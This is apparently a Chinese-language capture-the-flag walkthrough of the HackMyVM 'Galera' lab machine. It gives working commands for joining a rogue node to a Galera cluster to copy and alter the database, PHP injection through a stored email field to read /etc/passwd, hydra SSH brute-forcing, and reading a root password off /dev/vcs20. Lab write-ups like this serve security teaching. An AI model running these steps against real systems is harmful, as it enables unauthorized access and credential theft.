![image-20251109000521177](http://7r1UMPHK.github.io/image/20251109092013328.webp)

>**靶机地址**: https://hackmyvm.eu/machines/machine.php?vm=Galera
>
>**难度**：困难
>
>**作者**：Lenam

## 一、信息收集

### 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.140 08:00:27:fc:f6:7c       PCS Systemtechnik GmbH
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.140`。

### 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.140
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:33 CST
Nmap scan report for 192.168.205.140
Host is up (0.00028s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4567/tcp open  tram
MAC Address: 08:00:27:FC:F6:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现目标开放了三个端口：

*   **22/tcp**: SSH 服务
*   **80/tcp**: HTTP 服务
*   **4567/tcp**: 一个未知服务，Nmap 标记为 `tram`

对 `4567` 端口进行深入探测，但 Nmap 无法识别其具体服务。结合靶机名称 "Galera"，推测该端口可能与 Galera Cluster for MySQL 相关。

## 二、漏洞发现与利用

### 2.1 Web 服务枚举

访问 `http://192.168.205.140`，发现一个登录页面。尝试了常见的弱口令 和 SQL 注入，均未成功。

![image-20251109000546354](http://7r1UMPHK.github.io/image/20251109092010813.webp)

使用 `dirsearch` 进行目录爆破，发现 `info.php` 页面，确认 Web 服务以 `www-data` 用户运行。

### 2.2 Galera Cluster 未授权访问

根据靶机名称和开放的 4567 端口，我们尝试利用 Galera Cluster 的同步机制来获取数据库访问权限。通过将我们的攻击机伪装成集群的一个节点，我们可以同步到目标数据库的数据。

1. **配置本地 MariaDB/MySQL**：
   在攻击机（Kali）上修改 MariaDB 的 Galera 配置文件 (`/etc/mysql/mariadb.conf.d/60-galera.cnf`)，添加以下内容，将目标主机设置为集群地址。

   ```ini
   [galera]
   wsrep_on=ON
   wsrep_provider=/usr/lib/galera/libgalera_smm.so
   wsrep_cluster_address="gcomm://192.168.205.140:4567"
   wsrep_node_address="192.168.205.128"
   wsrep_node_name ="kali"
   wsrep_sst_method=rsync
   binlog_format=ROW
   default_storage_engine=InnoDB
   bind-address=0.0.0.0
   ```

2. **重启本地数据库服务并连接**：

   ```bash
   sudo systemctl restart mariadb
   ```

   重启成功后，以 root 身份登录本地数据库。此时，本地数据库已经和目标靶机的数据库完成了同步。

3. **窃取用户凭证**：
   查询同步过来的数据库，发现 `galeradb` 数据库中的 `users` 表。

   ```sql
   MariaDB [(none)]> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | galeradb           |
   ...
   +--------------------+
   
   MariaDB [(none)]> use galeradb;
   Database changed
   
   MariaDB [galeradb]> select * from users;
   +----+----------+------------------+--------------------------------------------------------------+---------------------+
   | id | username | email            | password                                                     | created_at          |
   +----+----------+------------------+--------------------------------------------------------------+---------------------+
   |  1 | admin    | admin@galera.hmv | $2y$10$BCAQ6VSNOL9TzfE5/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-05 07:55:51 |
   +----+----------+------------------+--------------------------------------------------------------+---------------------+
   ```

   我们得到了 `admin` 用户的密码哈希。尝试破解该哈希失败后，决定直接修改密码。

4. **修改管理员密码**：
   执行 `UPDATE` 语句，将 `admin` 用户的密码哈希替换为一个已知密码（这里以 `1` 为例）的哈希值。

   ```sql
   UPDATE users SET password='$2y$12$uen2kChZPHnxfuE.LlUol.Daz1FKnVubVC.R.H.XlVgfeHV1OHtBq' WHERE username='admin';
   ```

   现在，我们可以使用 `admin:1` 登录 Web 应用。

### 2.3 RCE via 数据库注入

登录后台后，发现个人资料页面会显示用户的邮箱地址。测试发现，后端代码会直接将数据库中取出的邮箱内容渲染到`Message Log`上，存在注入漏洞。

1. **验证代码执行**：
   通过数据库连接，将 admin 的 email 修改为一段 PHP 测试代码。

   ```sql
   UPDATE users SET email='<?php phpinfo(); ?>' WHERE username='admin';
   ```

   重新登录并访问个人资料页，成功看到 `phpinfo()` 的输出，确认存在远程代码执行（RCE）漏洞。

   ![image-20251108232115582](http://7r1UMPHK.github.io/image/20251109092017353.webp)

2. **读取敏感文件**：
   `phpinfo` 的输出显示许多命令执行函数（如 `system`, `shell_exec`）被禁用。但文件包含函数（如 `include`）可用。利用该漏洞读取 `/etc/passwd` 文件。

   ```sql
   UPDATE users SET email="<?php include('/etc/passwd');?>" WHERE username='admin';
   ```

   刷新页面，成功读取到 `/etc/passwd` 内容，并发现一个自定义用户 `donjuandeaustria`。

### 2.4 获取初始 Shell

利用 `hydra` 对发现的 `donjuandeaustria` 用户进行 SSH 密码爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]                                                                                                                                                  
└─$ hydra -l donjuandeaustria -P /path/to/rockyou.txt ssh://192.168.205.140
...
[22][ssh] host: 192.168.205.140   login: donjuandeaustria   password: amorcito
...
```

成功爆破出密码为 `amorcito`，并使用该凭证成功登录 SSH，获得初始 Shell。

## 三、权限提升

### 3.1 donjuandeaustria -> root

登录后，查看当前用户所属的组。

```bash
donjuandeaustria@galera:~$ id
uid=1000(donjuandeaustria) gid=1000(donjuandeaustria) groups=1000(donjuandeaustria),5(tty),...
```

发现用户属于 `tty` 组，这意味着他可能拥有对某些 TTY的读写权限，这在多用户系统中是潜在的安全风险。通过遍历 `/dev/vcs*` 设备，可以查看到其他终端会话的屏幕内容。

*ps:https://www.man7.org/linux/man-pages/man4/vcs.4.html*

通过who查看当前登录的用户

```
donjuandeaustria@galera:/tmp$ who
root     tty20        2025-11-08 09:33
donjuandeaustria pts/0        2025-11-08 10:34 (192.168.205.128)
```

在检查 `/dev/vcs20` 时，意外发现了泄露的 root 密码。

```bash
donjuandeaustria@galera:~$ cat /dev/vcs20
...
er: your root password is 'saG58zJxs8crgQa366Uw' 
...
```

使用发现的密码 `saG58zJxs8crgQa366Uw` 切换到 `root` 用户。

```bash
donjuandeaustria@galera:~$ su -
Password: saG58zJxs8crgQa366Uw

root@galera:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功提升至 root 权限。

## 四、获取 Flag

提权成功后，读取 user 和 root 的 flag。

```bash
root@galera:~# cat /home/donjuandeaustria/user.txt
072f9d8c26547db59e65d7aa3e55747b

root@galera:~# cat /root/root.txt
6a0d424c13321ca6e3b2deb2295fcc26
```

渗透测试完成。

